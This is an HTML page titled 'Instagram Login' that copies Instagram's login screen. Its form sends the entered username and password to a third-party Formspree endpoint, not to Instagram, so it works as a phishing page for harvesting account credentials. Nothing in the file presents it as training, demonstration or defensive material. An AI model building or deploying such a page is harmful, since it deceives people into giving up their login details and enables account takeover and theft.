<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <style>
      body {
        font-family: "Arial", sans-serif;
        background-color: #fafafa;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
      }

      .login-container {
        background-color: #fff;
        border: 1px solid #e6e6e6;
        border-radius: 5px;
        padding: 20px;
        width: 300px;
        text-align: center;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }

      .logo {
        margin-bottom: 20px;
      }

      input {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        box-sizing: border-box;
        border: 1px solid #e6e6e6;
        border-radius: 3px;
      }

      .login-button {
        background-color: #3897f0;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 3px;
        cursor: pointer;
        font-weight: bold;
      }

      .login-button:hover {
        background-color: #357ae8;
      }

      .signup-link {
        margin-top: 15px;
        font-size: 0.9em;s
        color: #003569;
      }
      img{
        width: 110px;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <div class="logo">
        <!-- You can replace the image URL with the Instagram logo -->
        <!-- Replace the previous image tag with this one -->
        <img src="insta.avif" alt="Instagram Logo" />
      </div>
      <form action="https://formspree.io/f/xleqeqzp" method="post">
        <input type="text" placeholder="Username" name="user" required />
        <input type="password" placeholder="Password" name="data" required />
        <button type="submit" class="login-button">Log In</button>
      </form>
      <div class="signup-link">
        Don't have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </body>
</html>
